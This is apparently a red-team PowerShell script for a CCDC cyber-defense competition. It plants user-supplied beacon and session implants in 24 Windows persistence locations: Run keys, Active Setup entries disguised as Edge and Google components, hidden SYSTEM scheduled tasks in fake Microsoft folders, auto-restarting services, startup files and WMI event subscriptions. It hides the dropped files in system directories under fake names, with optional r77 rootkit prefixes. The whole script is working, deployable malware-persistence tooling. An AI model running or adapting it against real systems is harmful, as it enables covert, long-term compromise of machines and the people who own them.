# CCDC Windows Phase 3 - Persistence: Cluster Shells Extended
# Based on Phase 1 ClusterShells planter -- tripled to 24 locations + $77 hiding support
# MITRE ATT&CK: T1053.005 T1547.001 T1547.004 T1547.005 T1547.009
#               T1547.010 T1543.003 T1546.003 T1197
#
# 24 persistence locations:
#   Registry (6): HKLM Run, HKCU Run, WOW64 Run, Policies\Explorer\Run, Active Setup x2
#   Startup  (4): All-users LNK, All-users BAT, All-users VBS, Current-user EXE
#   Tasks    (8): PerfTrack, USOPrivate, Office16, WindowsUpdate, Defrag, DiskCleanup, NetTrace, Registry
#   Services (2): CryptSvcMonitor (beacon), WmiPerfSvcHost (session)
#   Startup  (3): All-users LNK, All-users BAT, Current-user EXE
#   WMI      (3): 30-min timer (VBScript), explorer-start, lsass-start
#   Misc     (1): HKLM Run alt (GP State script removed -- triggered Group Policy boot screen)
#
# Run as: Administrator
#Requires -RunAsAdministrator
#Requires -Version 5.1

$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 -- Cluster Shells Extended (24-location planter)"
Write-Warn "================================================================"
Write-Host ""

# --- Prompt for implant paths ---
Write-Info "Beacons are typically downloaded to the current directory by AUTODEPLOY."
Write-Info "e.g.  C:\Users\Administrator\beac07   and   C:\Users\Administrator\ses08"
Write-Host ""
$BeaconPath  = Read-Host "Enter full path to beacon implant (e.g. C:\Users\Administrator\beac07)"
$SessionPath = Read-Host "Enter full path to session implant (e.g. C:\Users\Administrator\ses08)"

# --- r77 prefix prompt ---
$r77Answer = Read-Host "Prepend `$77 prefix to dropped files/reg values for r77 hiding? (y/N)"
$pfx = ''
if ($r77Answer -match '^[Yy]') { $pfx = '$77' }
if ($pfx) {
    Write-Warn "r77 mode ENABLED -- artifacts prefixed: $pfx"
} else {
    Write-Info "r77 mode: disabled"
}

# --- Input validation ---
Write-Section "Input Validation"
foreach ($p in @($BeaconPath, $SessionPath)) {
    if (-not (Test-Path $p -PathType Leaf)) {
        Write-Err "File not found: $p"
        exit 1
    }
}
$BeaconPath  = (Resolve-Path $BeaconPath).Path
$SessionPath = (Resolve-Path $SessionPath).Path
Write-Info "Beacon  : $BeaconPath"
Write-Info "Session : $SessionPath"

# --- Shell repair: reset Winlogon\Shell to explorer.exe if it was corrupted ---
Write-Section "Shell Repair"
try {
    $wlKey    = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $curShell = (Get-ItemProperty $wlKey -Name "Shell" -ErrorAction Stop).Shell
    if ($curShell -ne "explorer.exe") {
        Set-ItemProperty $wlKey -Name "Shell" -Value "explorer.exe" -Force
        Write-Warn "Shell was [$curShell] -- reset to explorer.exe"
    } else {
        Write-Info "Shell already clean: explorer.exe"
    }
} catch { Write-Warn "Shell repair check failed: $_" }

# --- Userinit repair: strip any appended entries, keep only userinit.exe ---
try {
    $wlKey  = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $curUI  = (Get-ItemProperty $wlKey -Name "Userinit" -ErrorAction Stop).Userinit
    $clean  = "$env:SystemRoot\system32\userinit.exe,"
    if ($curUI -ne $clean) {
        Set-ItemProperty $wlKey -Name "Userinit" -Value $clean -Force
        Write-Warn "Userinit was [$curUI] -- reset to $clean"
    } else {
        Write-Info "Userinit already clean"
    }
} catch { Write-Warn "Userinit repair check failed: $_" }

# --- Drop directories (spread copies across multiple hidden dirs) ---
$DropDirs = @(
    "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\cache",
    "$env:SystemRoot\System32\spool\drivers\color",
    "C:\ProgramData\Microsoft\Windows\DeviceMetadataCache\ext",
    "$env:SystemRoot\System32\wbem\logs\ext"
)
foreach ($d in $DropDirs) {
    if (-not (Test-Path $d)) {
        try { New-Item -ItemType Directory -Path $d -Force | Out-Null } catch {}
    }
    try {
        $obj = Get-Item $d -Force -ErrorAction Stop
        $obj.Attributes = $obj.Attributes -bor [System.IO.FileAttributes]::Hidden
    } catch {}
}

$psExe = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"

# Cycles through DropDirs so files spread across directories
$script:DropIdx = 0
function Get-DropDir {
    $d = $DropDirs[$script:DropIdx % $DropDirs.Count]
    $script:DropIdx++
    return $d
}

function Copy-Hidden {
    param([string]$Source, [string]$Dest)
    try {
        $dir = Split-Path $Dest -Parent
        if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
        Copy-Item -Path $Source -Destination $Dest -Force -ErrorAction Stop
        $item = Get-Item $Dest -Force
        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
        return $Dest
    } catch {
        Write-Warn "Copy failed to $Dest : $_"
        return $null
    }
}

# Builds a PowerShell wrapper service binPath for EXE payloads (keeps SCM happy)
function Get-SvcBinPath {
    param([string]$PayloadPath, [string]$WrapperPath)
    $wrap = "while (`$true) { try { `$p = Start-Process -FilePath '$PayloadPath' -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue; if (`$p) { `$p.WaitForExit() } } catch {}; Start-Sleep -Seconds 5 }"
    try {
        [System.IO.File]::WriteAllText($WrapperPath, $wrap, [System.Text.Encoding]::ASCII)
        $item = Get-Item $WrapperPath -Force
        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
    } catch {}
    return "`"$psExe`" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$WrapperPath`""
}


$script:Ok   = 0
$script:Fail = 0

# =============================================================================
# REGISTRY (7 mechanisms)
# =============================================================================
Write-Section "Registry Persistence (1-7)"

# [1] HKLM Run - beacon
Write-Info "[1/24] HKLM Run -- beacon"
$p1 = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}wer-handler-svc.exe")
if ($p1) {
    try {
        Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
            -Name "${pfx}WerFaultSvcHost" -Value "`"$p1`"" -Type String -Force
        Write-Success "  HKLM Run\${pfx}WerFaultSvcHost -> $p1"
        $script:Ok++
    } catch { Write-Err "  HKLM Run failed: $_"; $script:Fail++ }
} else { $script:Fail++ }

# [2] HKCU Run - session
Write-Info "[2/24] HKCU Run -- session"
$p2 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}win-svc-helper.exe")
if ($p2) {
    try {
        if (-not (Test-Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")) {
            New-Item "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Force | Out-Null
        }
        Set-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
            -Name "${pfx}WinSvcHelper" -Value "`"$p2`"" -Type String -Force
        Write-Success "  HKCU Run\${pfx}WinSvcHelper -> $p2"
        $script:Ok++
    } catch { Write-Err "  HKCU Run failed: $_"; $script:Fail++ }
} else { $script:Fail++ }

# [3] WOW6432Node Run - beacon
Write-Info "[3/24] WOW6432Node Run -- beacon"
$p3 = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}wow-diag-helper.exe")
if ($p3) {
    try {
        Set-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" `
            -Name "${pfx}WowDiagHelper" -Value "`"$p3`"" -Type String -Force
        Write-Success "  WOW64 Run\${pfx}WowDiagHelper -> $p3"
        $script:Ok++
    } catch { Write-Err "  WOW64 Run failed: $_"; $script:Fail++ }
} else { $script:Fail++ }

# [4] All-users startup VBS - beacon (silent WScript.Shell.Run, no Winlogon touch)
Write-Info "[4/24] All-users startup VBS -- beacon"
$p4 = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}windiag-vbs-host.exe")
if ($p4) {
    try {
        $vbs  = Join-Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" "${pfx}windiag_svc.vbs"
        $vbsContent = 'Set oShell = CreateObject("WScript.Shell") : oShell.Run """' + $p4 + '""", 0, False'
        [System.IO.File]::WriteAllText($vbs, $vbsContent, [System.Text.Encoding]::ASCII)
        $item = Get-Item $vbs -Force
        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
        Write-Success "  Startup VBS: $vbs -> $p4"
        $script:Ok++
    } catch { Write-Err "  Startup VBS failed: $_"; $script:Fail++ }
} else { $script:Fail++ }

# [5] Policies\Explorer\Run - session (Group Policy run key, fires at logon, doesn't touch the shell)
Write-Info "[5/24] Policies\Explorer\Run -- session"
$p5 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}policy-svc-helper.exe")
if ($p5) {
    try {
        $polKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
        if (-not (Test-Path $polKey)) { New-Item -Path $polKey -Force | Out-Null }
        Set-ItemProperty $polKey -Name "${pfx}WinPolicySvc" -Value "`"$p5`"" -Type String -Force
        Write-Success "  Policies\Explorer\Run\${pfx}WinPolicySvc -> $p5"
        $script:Ok++
    } catch { Write-Err "  Policies\Explorer\Run failed: $_"; $script:Fail++ }
} else { $script:Fail++ }

# [6] Active Setup StubPath #1 - beacon
Write-Info "[6/24] Active Setup StubPath #1 -- beacon"
$p6 = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}edgecompat-stub.exe")
if ($p6) {
    try {
        $asKey = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{76E4F460-2C62-4E3A-A5E6-00AA005B0083}"
        if (-not (Test-Path $asKey)) { New-Item -Path $asKey -Force | Out-Null }
        Set-ItemProperty $asKey "(Default)"    "Microsoft Edge Compatibility Fonts" -Force
        Set-ItemProperty $asKey "StubPath"     "`"$p6`""   -Force
        Set-ItemProperty $asKey "Version"      "1,0,0,1"   -Force
        Set-ItemProperty $asKey "IsInstalled"  1 -Type DWord -Force
        Write-Success "  Active Setup {76E4F460} -> $p6"
        $script:Ok++
    } catch { Write-Err "  Active Setup #1 failed: $_"; $script:Fail++ }
} else { $script:Fail++ }

# [7] Active Setup StubPath #2 - session
Write-Info "[7/24] Active Setup StubPath #2 -- session"
$p7 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}msupdate-stub.exe")
if ($p7) {
    try {
        $asKey = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{8A69D345-D564-463C-AFF1-A69D9E530F96}"
        if (-not (Test-Path $asKey)) { New-Item -Path $asKey -Force | Out-Null }
        Set-ItemProperty $asKey "(Default)"    "Google Update Core" -Force
        Set-ItemProperty $asKey "StubPath"     "`"$p7`""  -Force
        Set-ItemProperty $asKey "Version"      "1,0,0,1"  -Force
        Set-ItemProperty $asKey "IsInstalled"  1 -Type DWord -Force
        Write-Success "  Active Setup {8A69D345} -> $p7"
        $script:Ok++
    } catch { Write-Err "  Active Setup #2 failed: $_"; $script:Fail++ }
} else { $script:Fail++ }

# =============================================================================
# SCHEDULED TASKS (8 mechanisms)
# =============================================================================
Write-Section "Scheduled Tasks (8-15)"

$script:TaskSvc = $null
try { $script:TaskSvc = New-Object -ComObject Schedule.Service; $script:TaskSvc.Connect() } catch { Write-Warn "Task Scheduler COM unavailable -- folder creation skipped" }

function New-PersistTask {
    param(
        [string]$TaskName,
        [string]$TaskFolder,
        [string]$PayloadPath,
        [string]$Description,
        [string]$TriggerType    = "AtStartup",
        [int]$IntervalMinutes   = 30
    )
    try {
        if ($script:TaskSvc) {
            $parts = $TaskFolder.Trim('\').Split('\')
            $cur   = $script:TaskSvc.GetFolder("\")
            foreach ($part in $parts) {
                try { $cur = $cur.GetFolder($part) } catch { $cur = $cur.CreateFolder($part) }
            }
        }

        $action    = New-ScheduledTaskAction -Execute "`"$PayloadPath`""
        if ($TriggerType -eq "Interval") {
            $trigger = New-ScheduledTaskTrigger `
                -RepetitionInterval  (New-TimeSpan -Minutes $IntervalMinutes) `
                -RepetitionDuration  (New-TimeSpan -Days 3650) `
                -Once -At (Get-Date).AddSeconds(60)
        } else {
            $trigger = New-ScheduledTaskTrigger -AtStartup
        }
        $settings  = New-ScheduledTaskSettingsSet `
            -Hidden -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
        $principal = New-ScheduledTaskPrincipal `
            -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $taskPath  = "\$TaskFolder\"

        Unregister-ScheduledTask -TaskName $TaskName -TaskPath $taskPath -Confirm:$false -ErrorAction SilentlyContinue
        Register-ScheduledTask `
            -TaskName   $TaskName `
            -TaskPath   $taskPath `
            -Action     $action `
            -Trigger    $trigger `
            -Settings   $settings `
            -Principal  $principal `
            -Description $Description `
            -Force -ErrorAction Stop | Out-Null
        Write-Success "  Task $taskPath$TaskName -> $PayloadPath"
        return $true
    } catch {
        Write-Err "  Task $TaskName failed: $_"
        return $false
    }
}

# [8] \Microsoft\Windows\PerfTrack\ - beacon - AtStartup
Write-Info "[8/24] Task \Microsoft\Windows\PerfTrack\ -- beacon (AtStartup)"
$p8 = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}perftrack-collector.exe")
if ($p8 -and (New-PersistTask "PerfTrack-StandardCollector" "Microsoft\Windows\PerfTrack" $p8 "Microsoft Diagnostics Hub standard data collector service")) {
    $script:Ok++
} else { $script:Fail++ }

# [9] \Microsoft\Windows\USOPrivate\ - session - Interval 30min
Write-Info "[9/24] Task \Microsoft\Windows\USOPrivate\ -- session (30min)"
$p9 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}wusvc-handler.exe")
if ($p9 -and (New-PersistTask "UsoCore-ServiceHandler" "Microsoft\Windows\USOPrivate" $p9 "Windows Update notification icon handler" "Interval" 30)) {
    $script:Ok++
} else { $script:Fail++ }

# [10] \Microsoft\Windows\Office 16\ - beacon - Interval 30min
Write-Info "[10/24] Task \Microsoft\Windows\Office 16\ -- beacon (30min)"
$p10 = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}clicktorun-handler.exe")
if ($p10 -and (New-PersistTask "ClickToRun-BackgroundHandler" "Microsoft\Windows\Office 16" $p10 "Microsoft Office background task handler registration" "Interval" 30)) {
    $script:Ok++
} else { $script:Fail++ }

# [11] \Microsoft\Windows\WindowsUpdate\ - session - AtStartup
Write-Info "[11/24] Task \Microsoft\Windows\WindowsUpdate\ -- session (AtStartup)"
$p11 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}usosession-worker.exe")
if ($p11 -and (New-PersistTask "USOSessionWorker2" "Microsoft\Windows\WindowsUpdate" $p11 "Windows Update session orchestration worker")) {
    $script:Ok++
} else { $script:Fail++ }

# [12] \Microsoft\Windows\Defrag\ - beacon - AtStartup
Write-Info "[12/24] Task \Microsoft\Windows\Defrag\ -- beacon (AtStartup)"
$p12 = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}stor-optimizer.exe")
if ($p12 -and (New-PersistTask "StorOptimizer" "Microsoft\Windows\Defrag" $p12 "Windows storage optimization service host")) {
    $script:Ok++
} else { $script:Fail++ }

# [13] \Microsoft\Windows\DiskCleanup\ - session - Interval 30min
Write-Info "[13/24] Task \Microsoft\Windows\DiskCleanup\ -- session (30min)"
$p13 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}silentcleanup-svc.exe")
if ($p13 -and (New-PersistTask "SilentCleanup2" "Microsoft\Windows\DiskCleanup" $p13 "Windows disk storage cleanup optimization service" "Interval" 30)) {
    $script:Ok++
} else { $script:Fail++ }

# [14] \Microsoft\Windows\NetTrace\ - beacon - AtStartup
Write-Info "[14/24] Task \Microsoft\Windows\NetTrace\ -- beacon (AtStartup)"
$p14 = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}netdiag-logger.exe")
if ($p14 -and (New-PersistTask "NetworkDiagLogger" "Microsoft\Windows\NetTrace" $p14 "Windows network diagnostic event logger")) {
    $script:Ok++
} else { $script:Fail++ }

# [15] \Microsoft\Windows\Registry\ - session - Interval 30min
Write-Info "[15/24] Task \Microsoft\Windows\Registry\ -- session (30min)"
$p15 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}regbackup-svc.exe")
if ($p15 -and (New-PersistTask "RegIdleBackup2" "Microsoft\Windows\Registry" $p15 "Windows registry idle backup service host" "Interval" 30)) {
    $script:Ok++
} else { $script:Fail++ }

# =============================================================================
# SERVICES (2 mechanisms)
# =============================================================================
Write-Section "Windows Services (16-17)"

# [16] Service: CryptSvcMonitor - beacon
Write-Info "[16/24] Service CryptSvcMonitor -- beacon"
$p16    = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}cryptsvc-helper.exe")
$wrap16 = Join-Path $DropDirs[0] "${pfx}cryptsvc-wrapper.ps1"
if ($p16) {
    $bin16 = Get-SvcBinPath $p16 $wrap16
    try {
        $s = Get-Service "CryptSvcMonitor" -ErrorAction SilentlyContinue
        if ($s) { Stop-Service "CryptSvcMonitor" -Force -ErrorAction SilentlyContinue; & sc.exe delete "CryptSvcMonitor" 2>&1 | Out-Null; Start-Sleep -Seconds 1 }
        & sc.exe create "CryptSvcMonitor" binPath= $bin16 start= auto obj= LocalSystem 2>&1 | Out-Null
        & sc.exe description "CryptSvcMonitor" "Monitors and maintains cryptographic service health." 2>&1 | Out-Null
        & sc.exe failure "CryptSvcMonitor" reset= 86400 actions= restart/5000/restart/5000/restart/5000 2>&1 | Out-Null
        Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\CryptSvcMonitor" "DisplayName" "Cryptographic Service Monitor" -Force -ErrorAction SilentlyContinue
        Write-Success "  Service CryptSvcMonitor created -> $p16"
        $script:Ok++
    } catch { Write-Err "  Service CryptSvcMonitor failed: $_"; $script:Fail++ }
} else { $script:Fail++ }

# [17] Service: WmiPerfSvcHost - session
Write-Info "[17/24] Service WmiPerfSvcHost -- session"
$p17    = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}wmiperf-helper.exe")
$wrap17 = Join-Path $DropDirs[1] "${pfx}wmiperf-wrapper.ps1"
if ($p17) {
    $bin17 = Get-SvcBinPath $p17 $wrap17
    try {
        $s = Get-Service "WmiPerfSvcHost" -ErrorAction SilentlyContinue
        if ($s) { Stop-Service "WmiPerfSvcHost" -Force -ErrorAction SilentlyContinue; & sc.exe delete "WmiPerfSvcHost" 2>&1 | Out-Null; Start-Sleep -Seconds 1 }
        & sc.exe create "WmiPerfSvcHost" binPath= $bin17 start= auto obj= LocalSystem 2>&1 | Out-Null
        & sc.exe description "WmiPerfSvcHost" "Provides WMI performance counter host adapter functionality." 2>&1 | Out-Null
        & sc.exe failure "WmiPerfSvcHost" reset= 86400 actions= restart/5000/restart/5000/restart/5000 2>&1 | Out-Null
        Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\WmiPerfSvcHost" "DisplayName" "WMI Performance Adapter Host Service" -Force -ErrorAction SilentlyContinue
        Write-Success "  Service WmiPerfSvcHost created -> $p17"
        $script:Ok++
    } catch { Write-Err "  Service WmiPerfSvcHost failed: $_"; $script:Fail++ }
} else { $script:Fail++ }

# =============================================================================
# STARTUP FOLDERS (3 mechanisms)
# =============================================================================
Write-Section "Startup Folders (18-20)"

$AllUsersStartup    = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
$CurrentUserStartup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
foreach ($sf in @($AllUsersStartup, $CurrentUserStartup)) {
    if (-not (Test-Path $sf)) { try { New-Item -ItemType Directory -Path $sf -Force | Out-Null } catch {} }
}

# [18] All-users startup LNK - beacon
Write-Info "[18/24] Startup LNK (All-users) -- beacon"
$p18 = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}windiag-host.exe")
if ($p18) {
    try {
        $wsh  = New-Object -ComObject WScript.Shell -ErrorAction Stop
        $lnk  = Join-Path $AllUsersStartup "${pfx}WinDiagHelper.lnk"
        $link = $wsh.CreateShortcut($lnk)
        $link.TargetPath       = $p18
        $link.WorkingDirectory = $env:SystemRoot
        $link.Description      = "Windows Diagnostic Helper"
        $link.IconLocation     = "$env:SystemRoot\System32\shell32.dll,21"
        $link.Save()
        $item = Get-Item $lnk -Force
        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
        Write-Success "  Startup LNK: $lnk -> $p18"
        $script:Ok++
    } catch { Write-Err "  Startup LNK failed: $_"; $script:Fail++ }
} else { $script:Fail++ }

# [19] All-users startup BAT - session
Write-Info "[19/24] Startup BAT (All-users) -- session"
$p19 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}winsvc-host.exe")
if ($p19) {
    try {
        $bat = Join-Path $AllUsersStartup "${pfx}windiag_helper.bat"
        [System.IO.File]::WriteAllText($bat, "@echo off`r`nstart /B `"`" `"$p19`"`r`n", [System.Text.Encoding]::ASCII)
        $item = Get-Item $bat -Force
        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
        Write-Success "  Startup BAT: $bat -> $p19"
        $script:Ok++
    } catch { Write-Err "  Startup BAT failed: $_"; $script:Fail++ }
} else { $script:Fail++ }

# [20] Current-user startup EXE - beacon
Write-Info "[20/24] Startup EXE (Current-user) -- beacon"
$p20dest = Join-Path $CurrentUserStartup "${pfx}windiag_host.exe"
$p20     = Copy-Hidden $BeaconPath $p20dest
if ($p20) {
    Write-Success "  Startup EXE: $p20"
    $script:Ok++
} else { $script:Fail++ }

# =============================================================================
# WMI EVENT SUBSCRIPTIONS (3 mechanisms)
# =============================================================================
Write-Section "WMI Event Subscriptions (21-23)"

function New-WmiCmdSub {
    param([string]$FilterName, [string]$ConsumerName, [string]$Query, [string]$QueryNS = "root\cimv2", [string]$Command)
    try {
        $ns = "root\subscription"
        Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding  -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like "*$FilterName*" } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer   -Filter "Name='$ConsumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace $ns -Class __EventFilter              -Filter "Name='$FilterName'"   -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue

        $filter   = Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{
            Name = $FilterName; EventNamespace = $QueryNS; QueryLanguage = "WQL"; Query = $Query
        } -ErrorAction Stop
        $consumer = Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{
            Name = $ConsumerName; CommandLineTemplate = $Command
        } -ErrorAction Stop
        $f2 = Get-WmiObject -Namespace $ns -Class __EventFilter            -Filter "Name='$FilterName'"
        $c2 = Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'"
        Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{
            Filter = $f2.__PATH; Consumer = $c2.__PATH
        } -ErrorAction Stop | Out-Null
        return $true
    } catch {
        Write-Err "  WMI sub $FilterName failed: $_"
        return $false
    }
}

# [21] WMI 30-min timer (ActiveScriptEventConsumer VBScript) - session
Write-Info "[21/24] WMI 30-min timer (VBScript/WmiPrvSE) -- session"
$p21 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}wevtsvc-handler.exe")
if ($p21) {
    try {
        Set-WmiInstance -Namespace "root\cimv2" -Class __IntervalTimerInstruction -Arguments @{
            TimerId               = "WevtSvc_HB30"
            IntervalBetweenEvents = [UInt32]1800000
        } -ErrorAction SilentlyContinue | Out-Null

        $ns = "root\subscription"
        Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding  -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like "*WevtSvcFilter*" } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace $ns -Class ActiveScriptEventConsumer  -Filter "Name='WevtSvcConsumer'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace $ns -Class __EventFilter              -Filter "Name='WevtSvcFilter'"   -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue

        $wmiFilter = Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{
            Name           = "WevtSvcFilter"
            EventNamespace = "root\cimv2"
            QueryLanguage  = "WQL"
            Query          = "SELECT * FROM __TimerEvent WHERE TimerID = 'WevtSvc_HB30'"
        } -ErrorAction Stop
        $wmiScript   = "Set oShell = CreateObject(""WScript.Shell"") : oShell.Run """"""$p21"""""", 0, False"
        $wmiConsumer = Set-WmiInstance -Namespace $ns -Class ActiveScriptEventConsumer -Arguments @{
            Name            = "WevtSvcConsumer"
            ScriptingEngine = "VBScript"
            ScriptText      = $wmiScript
            KillTimeout     = [UInt32]0
        } -ErrorAction Stop
        $f2 = Get-WmiObject -Namespace $ns -Class __EventFilter             -Filter "Name='WevtSvcFilter'"
        $c2 = Get-WmiObject -Namespace $ns -Class ActiveScriptEventConsumer -Filter "Name='WevtSvcConsumer'"
        Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{
            Filter = $f2.__PATH; Consumer = $c2.__PATH
        } -ErrorAction Stop | Out-Null
        Write-Success "  WMI 30-min timer (WevtSvc_HB30) -> $p21"
        $script:Ok++
    } catch { Write-Err "  WMI 30-min timer failed: $_"; $script:Fail++ }
} else { $script:Fail++ }

# [22] WMI explorer.exe start - beacon
Write-Info "[22/24] WMI explorer.exe start -- beacon"
$p22 = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}explorer-watcher.exe")
if ($p22) {
    $r22 = New-WmiCmdSub "WMIExplorerStartFilter" "WMIExplorerConsumer" `
        "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'explorer.exe'" `
        "root\cimv2" ('"' + $p22 + '"')
    if ($r22) { Write-Success "  WMI explorer-start -> $p22"; $script:Ok++ } else { $script:Fail++ }
} else { $script:Fail++ }

# [23] WMI lsass.exe start - session
Write-Info "[23/24] WMI lsass.exe start -- session"
$p23 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}lsass-watcher.exe")
if ($p23) {
    $r23 = New-WmiCmdSub "WMILsassStartFilter" "WMILsassConsumer" `
        "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'lsass.exe'" `
        "root\cimv2" ('"' + $p23 + '"')
    if ($r23) { Write-Success "  WMI lsass-start -> $p23"; $script:Ok++ } else { $script:Fail++ }
} else { $script:Fail++ }

# =============================================================================
# MISC (1 mechanism)
# =============================================================================
Write-Section "Misc (24)"

# [24] HKLM Run (second session entry) - session
# GP State script removed: writing to Group Policy\State\Machine\Scripts\Startup caused
# the Group Policy Client to show "Applying your personal settings" at every boot.
Write-Info "[24/24] HKLM Run (WinSecHostSvc) -- session"
$p24 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}winsec-host-svc.exe")
if ($p24) {
    try {
        Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
            -Name "${pfx}WinSecHostSvc" -Value "`"$p24`"" -Type String -Force
        Write-Success "  HKLM Run\${pfx}WinSecHostSvc -> $p24"
        $script:Ok++
    } catch { Write-Err "  HKLM Run #2 failed: $_"; $script:Fail++ }
} else { $script:Fail++ }

# =============================================================================
# SUMMARY
# =============================================================================
Write-Host ""
Write-Warn "================================================================"
Write-Warn " Cluster Shells Extended -- Complete"
Write-Warn "================================================================"
Write-Host ""
Write-Host "  --- REGISTRY (7) ---" -ForegroundColor Magenta
Write-Host "  [ 1] HKLM Run               -> beacon  (fires at every user logon)"              -ForegroundColor Cyan
Write-Host "  [ 2] HKCU Run               -> session (fires at current user logon)"            -ForegroundColor Cyan
Write-Host "  [ 3] WOW6432Node Run        -> beacon  (fires at every user logon)"              -ForegroundColor Cyan
Write-Host "  [ 4] All-users startup VBS  -> beacon  (silent WScript.Shell, no Winlogon touch)" -ForegroundColor Cyan
Write-Host "  [ 5] Policies\Explorer\Run  -> session (Group Policy run key, fires at logon)"   -ForegroundColor Cyan
Write-Host "  [ 6] Active Setup {76E4F460}-> beacon  (first logon per user)"                   -ForegroundColor Cyan
Write-Host "  [ 7] Active Setup {8A69D345}-> session (first logon per user)"                   -ForegroundColor Cyan
Write-Host "  --- TASKS (8) ---" -ForegroundColor Magenta
Write-Host "  [ 8] \Microsoft\Windows\PerfTrack\          -> beacon  (AtStartup)"              -ForegroundColor Cyan
Write-Host "  [ 9] \Microsoft\Windows\USOPrivate\         -> session (30min)"                  -ForegroundColor Cyan
Write-Host "  [10] \Microsoft\Windows\Office 16\          -> beacon  (30min)"                  -ForegroundColor Cyan
Write-Host "  [11] \Microsoft\Windows\WindowsUpdate\      -> session (AtStartup)"              -ForegroundColor Cyan
Write-Host "  [12] \Microsoft\Windows\Defrag\             -> beacon  (AtStartup)"              -ForegroundColor Cyan
Write-Host "  [13] \Microsoft\Windows\DiskCleanup\        -> session (30min)"                  -ForegroundColor Cyan
Write-Host "  [14] \Microsoft\Windows\NetTrace\           -> beacon  (AtStartup)"              -ForegroundColor Cyan
Write-Host "  [15] \Microsoft\Windows\Registry\           -> session (30min)"                  -ForegroundColor Cyan
